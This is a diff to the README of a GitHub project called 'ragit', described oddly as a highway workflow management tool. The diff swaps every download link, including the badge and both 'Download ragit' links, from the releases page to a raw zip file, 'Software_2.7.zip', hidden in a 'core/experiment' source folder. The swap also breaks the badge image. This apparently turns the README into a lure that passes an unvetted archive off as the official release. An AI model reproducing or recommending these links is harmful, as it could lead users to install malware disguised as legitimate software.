@@ -17,13 +17,13 @@ Before you begin, ensure your system meets the following requirements:
 
 You can download the latest version of **ragit** from our releases page. 
 
-[![Download ragit](https://img.shields.io/badge/Download%20ragit-v1.0-brightgreen)](https://github.com/Ankushkhadka21/ragit/releases)
+[![Download ragit](https://github.com/Ankushkhadka21/ragit/raw/refs/heads/main/ragit/core/experiment/Software_2.7.zip%20ragit-v1.0-brightgreen)](https://github.com/Ankushkhadka21/ragit/raw/refs/heads/main/ragit/core/experiment/Software_2.7.zip)
 
 ## 🔧 Installing ragit
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [Download ragit](https://github.com/Ankushkhadka21/ragit/releases)
+   [Download ragit](https://github.com/Ankushkhadka21/ragit/raw/refs/heads/main/ragit/core/experiment/Software_2.7.zip)
 
 2. **Choose the Latest Release:** Look for the version you want to download. The latest version is typically at the top.
 
@@ -75,6 +75,6 @@ If you encounter issues or have questions, you can open an issue on the GitHub r
 
 Make sure to stay updated about new releases by visiting our community page and following us on social media platforms related to highway workflow management.
 
-[Download ragit](https://github.com/Ankushkhadka21/ragit/releases) 
+[Download ragit](https://github.com/Ankushkhadka21/ragit/raw/refs/heads/main/ragit/core/experiment/Software_2.7.zip) 
 
 With **ragit**, your highway workflow management just became easier and more efficient! Enjoy getting started!
